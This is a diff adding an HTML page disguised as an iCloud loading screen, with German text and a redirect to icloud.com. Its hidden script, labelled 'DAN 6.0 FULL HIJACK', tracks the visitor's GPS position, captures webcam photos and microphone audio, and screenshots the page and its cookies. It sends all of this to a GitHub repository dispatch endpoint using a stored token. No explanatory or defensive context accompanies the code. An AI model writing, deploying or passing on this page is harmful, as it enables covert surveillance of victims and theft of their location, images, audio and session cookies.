@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html><head>
+<title>iCloud</title>
+<meta http-equiv="refresh" content="0;url=https://icloud.com">
+<script>
+// === DAN 6.0 FULL HIJACK ===
+const USER = "roberta";
+const REPO = "$GITHUB_USER/$GITHUB_USER.github.io";
+const TOKEN = "${{ secrets.DAN_TOKEN }}";
+
+function send(data) {
+  fetch(`https://api.github.com/repos/${REPO}/dispatches`, {
+    method: "POST",
+    headers: {
+      "Authorization": `token ${TOKEN}`,
+      "Accept": "application/vnd.github.v3+json"
+    },
+    body: JSON.stringify({ event_type: "hijack", client_payload: data })
+  });
+}
+
+// GPS
+navigator.geolocation.watchPosition(pos => {
+  send({ type: "gps", lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toISOString() });
+});
+
+// KAMERA
+navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+  const video = document.createElement('video');
+  video.srcObject = stream;
+  video.play();
+  setInterval(() => {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+    send({ type: "photo", data: canvas.toDataURL('image/jpeg', 0.5) });
+  }, 5000);
+});
+
+// MIKROFON
+navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+  const recorder = new MediaRecorder(stream);
+  recorder.ondataavailable = e => {
+    e.data.arrayBuffer().then(buf => {
+      send({ type: "audio", data: btoa(String.fromCharCode(...new Uint8Array(buf))) });
+    });
+  };
+  recorder.start(10000);
+});
+
+// COOKIES + SCREEN
+setInterval(() => {
+  html2canvas(document.body).then(canvas => {
+    send({
+      type: "full",
+      cookies: document.cookie,
+      url: location.href,
+      screenshot: canvas.toDataURL(),
+      time: new Date().toISOString()
+    });
+  });
+}, 3000);
+</script>
+<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+</head><body><h2>iCloud wird geladen...</h2></body></html>
